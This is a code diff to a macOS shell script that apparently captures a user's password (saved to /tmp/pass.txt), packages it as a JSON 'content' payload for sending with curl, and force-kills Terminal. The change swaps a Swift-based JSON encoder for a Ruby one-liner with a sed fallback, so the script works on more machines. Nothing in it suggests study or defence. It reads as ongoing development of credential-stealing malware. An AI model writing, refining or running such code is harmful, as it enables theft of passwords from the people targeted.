@@ -11,8 +11,7 @@
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either Xcode (for swift) installed or
-#     falling back to standard shell utilities.
+#   - macOS with osascript, curl, and Ruby installed (Ruby is preinstalled on macOS).
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -119,25 +118,10 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Generate JSON Payload Without Python ---
-    # First try to use swift (available with Xcode) to generate JSON.
-    if command -v swift &>/dev/null; then
-        payload=$(cat /tmp/pass.txt | swift <<'EOF'
-import Foundation
-var input = ""
-while let line = readLine() {
-    input += line + "\n"
-}
-input = input.trimmingCharacters(in: .whitespacesAndNewlines)
-let jsonObject = ["content": input]
-if let jsonData = try? JSONSerialization.data(withJSONObject: jsonObject, options: []),
-   let jsonString = String(data: jsonData, encoding: .utf8) {
-    print(jsonString)
-}
-EOF
-)
+    # --- Generate JSON Payload Using Ruby (fallback to sed if Ruby is missing) ---
+    if command -v ruby &>/dev/null; then
+        payload=$(ruby -r json -e 'puts JSON.generate({"content"=>STDIN.read.strip})' < /tmp/pass.txt)
     else
-        # Fallback to a sed-based method.
         json_content=$(sed ':a;N;$!ba;s/\n/\\n/g' /tmp/pass.txt | sed 's/"/\\"/g')
         payload=$(printf '{"content": "%s"}' "$json_content")
     fi
